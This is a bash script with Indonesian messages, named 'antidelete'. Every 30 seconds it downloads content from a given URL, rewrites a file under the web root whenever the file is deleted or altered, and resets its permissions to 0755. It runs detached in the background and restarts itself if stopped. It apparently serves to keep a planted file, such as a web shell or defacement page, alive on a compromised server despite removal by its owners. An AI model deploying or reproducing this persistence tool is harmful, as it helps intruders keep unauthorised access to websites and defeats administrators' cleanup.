#!/bin/bash

if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Error: Path file dan URL harus diberikan sebagai argumen."
  echo "Contoh penggunaan: bash antidelete /var/www/html/test.txt https://localhost/test.txt"
  exit 1
fi

FILE_PATH="$1"

URL="$2"

FILE_DIR=$(dirname "$FILE_PATH")

EXPECTED_PERMISSIONS="0755"

create_directory() {
  if [ ! -d "$FILE_DIR" ]; then
    echo "$(date): Direktori $FILE_DIR tidak ditemukan. Membuat direktori..."
    mkdir -p "$FILE_DIR"
    if [ $? -ne 0 ]; then
      echo "$(date): Error: Gagal membuat direktori $FILE_DIR."
      exit 1
    else
      echo "$(date): Direktori $FILE_DIR berhasil dibuat."
    fi
  fi
}

fetch_content() {
  if command -v curl &>/dev/null; then
    echo "$(date): Mencoba mengambil konten menggunakan curl..."
    curl -s "$URL"
    if [ $? -eq 0 ]; then
      return 0
    fi
  fi

  if command -v wget &>/dev/null; then
    echo "$(date): Mencoba mengambil konten menggunakan wget..."
    wget -qO- "$URL"
    if [ $? -eq 0 ]; then
      return 0
    fi
  fi

  if command -v fetch &>/dev/null; then
    echo "$(date): Mencoba mengambil konten menggunakan fetch..."
    fetch -qo- "$URL"
    if [ $? -eq 0 ]; then
      return 0
    fi
  fi

  if command -v http &>/dev/null; then
    echo "$(date): Mencoba mengambil konten menggunakan httpie..."
    http -b GET "$URL"
    if [ $? -eq 0 ]; then
      return 0
    fi
  fi

  echo "$(date): Error: Gagal mengambil konten dari URL $URL. Tidak ada metode yang tersedia (curl, wget, fetch, httpie)."
  return 1
}

update_file() {
  echo "$EXPECTED_CONTENT" > "$FILE_PATH"
  echo "$(date): File $FILE_PATH telah dibuat/diperbarui dengan isi dari URL $URL."
}

check_and_update_permissions() {
  CURRENT_PERMISSIONS=$(stat -c "%a" "$FILE_PATH" 2>/dev/null)

  if [ "$CURRENT_PERMISSIONS" != "$EXPECTED_PERMISSIONS" ]; then
    echo "$(date): Izin file $FILE_PATH adalah $CURRENT_PERMISSIONS. Mengubah izin ke $EXPECTED_PERMISSIONS..."
    chmod "$EXPECTED_PERMISSIONS" "$FILE_PATH"
    if [ $? -ne 0 ]; then
      echo "$(date): Error: Gagal mengubah izin file $FILE_PATH."
    else
      echo "$(date): Izin file $FILE_PATH berhasil diubah ke $EXPECTED_PERMISSIONS."
    fi
  else
    echo "$(date): Izin file $FILE_PATH sudah sesuai ($EXPECTED_PERMISSIONS)."
  fi
}

run_process() {
  while true; do
    create_directory

    EXPECTED_CONTENT=$(fetch_content)
    if [ $? -ne 0 ]; then
      echo "$(date): Error: Gagal mengambil konten dari URL $URL."
      sleep 30
      continue
    fi

    if [ ! -f "$FILE_PATH" ]; then
      echo "$(date): File $FILE_PATH tidak ditemukan. Membuat file baru dengan konten dari URL..."
      update_file
    else
      if grep -Fxq "$EXPECTED_CONTENT" "$FILE_PATH"; then
        echo "$(date): Isi file $FILE_PATH sesuai dengan konten dari URL $URL."
      else
        echo "$(date): Isi file $FILE_PATH TIDAK sesuai dengan konten dari URL $URL. Memperbarui file..."
        update_file
      fi
    fi

    check_and_update_permissions

    sleep 30
  done
}

(
  while true; do
    run_process
    echo "$(date): Proses dihentikan. Memulai kembali..."
    sleep 1
  done
) &

disown

echo "Script telah berjalan dan akan memulihkan diri jika dihentikan."